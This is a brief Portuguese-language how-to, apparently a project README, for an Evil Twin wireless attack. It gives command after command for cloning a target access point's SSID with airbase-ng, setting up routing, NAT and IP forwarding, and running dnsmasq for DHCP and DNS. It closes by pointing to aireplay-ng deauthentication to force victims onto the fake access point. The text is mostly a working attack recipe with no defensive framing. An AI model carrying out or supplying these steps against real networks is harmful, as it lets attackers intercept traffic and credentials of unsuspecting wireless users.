O ataque Evil Twin consiste na criação de um Fake Access Point, que irá copiar o SSID de um Access Point real. O objetivo é desautenticar os clientes no Access Point real, fazendo com que eles se conectem ao Fake Access Point.

1 - Configurar o arquivo dnsmasq.conf, para iniciar os servidores DHCP e DNS pelo dnsmasq. Mais detalhes no arquivo dnsmasq.conf

2 - Iniciar a interface de monitoramento com airmon-ng 
sudo airmon-ng start interface
OBS: pode ser necessário matar processos que interferem no funcionamento correto da interface: sudo airmon-ng check kill

3 - Identificar AP alvo com airodump-ng
sudo airodump-ng interface

4 - Criar AP fake com airbase-ng
sudo airbase-ng -e "ssid_alvo" -c canal_alvo interface

Uma nova interface at0 será iniciada. Inicialmente desligada

5 - Subir e configurar a interface at0. 
sudo ifconfig at0 up

sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 
ip do gateway e máscara de sub-rede

sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
cria configuração de na tabela de roteamento para redirecionar tráfego ao gateway

sudo iptables -P FORWARD ACCEPT
configura redirecionamento 

sudo iptables -t nat -A POSTROUTING -o interface -j MASQUERADE

(COMO ROOT) echo 1 > /proc/sys/net/ipv4/ip_forward
habilita roteamento global

6 - Iniciar o dnsmasq
sudo dnsmasq -C ./dnsmasq.conf -d

Após iniciar e configurar o AP fake, pode se utilizar desautenticação com aireplay-ng e forçar o alvo a se conectar no evil twin. Dispositivos armazenam em cache o SSID de pontos de acesso.
